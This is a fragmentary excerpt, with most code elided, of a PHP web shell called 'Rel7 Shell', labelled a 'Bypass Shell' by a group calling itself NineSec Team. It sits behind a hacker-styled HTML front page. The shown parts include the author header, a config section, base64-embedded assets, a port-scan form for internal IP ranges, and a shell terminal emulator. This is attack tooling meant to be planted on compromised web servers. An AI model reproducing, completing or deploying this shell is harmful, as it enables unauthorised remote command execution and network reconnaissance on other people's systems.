...
<style>
  ...
  <body bgcolor="black">
	...
	<center><h1><center><font color="#00BFFF" face="Rye">-=[ J4CK Gans Valid No Debat ]=-</font><br>
	</center>
	<form method="post">
...
/*--------------------------------------------------
 | Rel7 Shell
 +--------------------------------------------------
 | Bypass Shell By Rel7
 | NineSec Team
 | E-mail: admin@armano.vn
 | Blog : https://ninesec.eu.org
 | Last Changed: 6-12-2021
 +--------------------------------------------------
...
if (!function_exists('mb_strtoupper')) {
    die('Rel7 Shell<br>Error: Please enable "mbstring" php module.');
}
// +--------------------------------------------------
// | Config Class
// +--------------------------------------------------
...
// +--------------------------------------------------
// | BASE64 FILES
// | So that Rel7 Shell can remain a single file script,
...
function portscan_form(){
    ...
    <!--
        ...
        write_to_iframe(get_boxed_text('Rel7 Shell - Portscan<br><br><b>Hosts examples:</b><br>Single: phpfm.sf.net<br>Single: 192.168.0.1<br>Range: 192.168.0.1-254<br>Multiple: phpfm.sf.net,192.168.0.1,192.168.0.2'));
        ...
        function execute_portscan(){
            ...
            portscan_command_str += 'Rel7 Shell - Portscan<br><br>';
...
function shell_form(){
    ...
    switch ($shell_form){
        ...
        default:
            ...
            $greetings = array();
            $greetings[] = 'Rel7 Shell - Shell Terminal Emulator';
            $greetings[] = '';
